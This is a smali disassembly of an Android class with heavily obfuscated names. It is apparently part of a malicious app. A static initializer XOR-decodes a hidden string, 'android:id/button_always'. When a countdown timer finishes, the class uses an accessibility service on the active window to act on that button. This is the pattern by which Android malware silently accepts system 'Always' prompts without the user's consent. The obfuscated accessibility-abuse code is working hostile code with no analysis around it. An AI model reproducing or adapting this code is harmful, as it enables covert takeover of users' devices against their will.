.class Lzvy/zpfypq/bbuhtkwvaf/g;
.super Landroid/os/CountDownTimer;


# static fields
.field private static final a:Ljava/lang/String;


# instance fields
.field final synthetic b:Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    const-string v0, "2\tg7\u007f:\u00039,t|\u0005v1d<\t\\$|$\u0006z6"

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    array-length v1, v0

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-gt v1, v3, :cond_2

    :cond_0
    move-object v3, v0

    move v4, v2

    move v7, v1

    move-object v1, v0

    move v0, v7

    :goto_0
    aget-char v6, v1, v2

    rem-int/lit8 v5, v4, 0x5

    packed-switch v5, :pswitch_data_0

    const/16 v5, 0x10

    :goto_1
    xor-int/2addr v5, v6

    int-to-char v5, v5

    aput-char v5, v1, v2

    add-int/lit8 v2, v4, 0x1

    if-nez v0, :cond_1

    move-object v1, v3

    move v4, v2

    move v2, v0

    goto :goto_0

    :cond_1
    move v1, v0

    move-object v0, v3

    :cond_2
    if-gt v1, v2, :cond_0

    new-instance v1, Ljava/lang/String;

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lzvy/zpfypq/bbuhtkwvaf/g;->a:Ljava/lang/String;

    return-void

    :pswitch_0
    const/16 v5, 0x53

    goto :goto_1

    :pswitch_1
    const/16 v5, 0x67

    goto :goto_1

    :pswitch_2
    const/4 v5, 0x3

    goto :goto_1

    :pswitch_3
    const/16 v5, 0x45

    goto :goto_1

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method

.method constructor <init>(Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;JJ)V
    .locals 0

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/g;->b:Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 5

    :try_start_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/g;->b:Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/g;->b:Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;

    invoke-virtual {v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;ILandroid/content/Context;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x12

    if-lt v0, v1, :cond_0

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/g;->b:Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;

    invoke-virtual {v0}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/g;->a:Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-static {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/IlllllIIlIlllllILIIIllllIlllllLIIIlLIIIllIllllIlIILllIll;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onTick(J)V
    .locals 0

    return-void
.end method
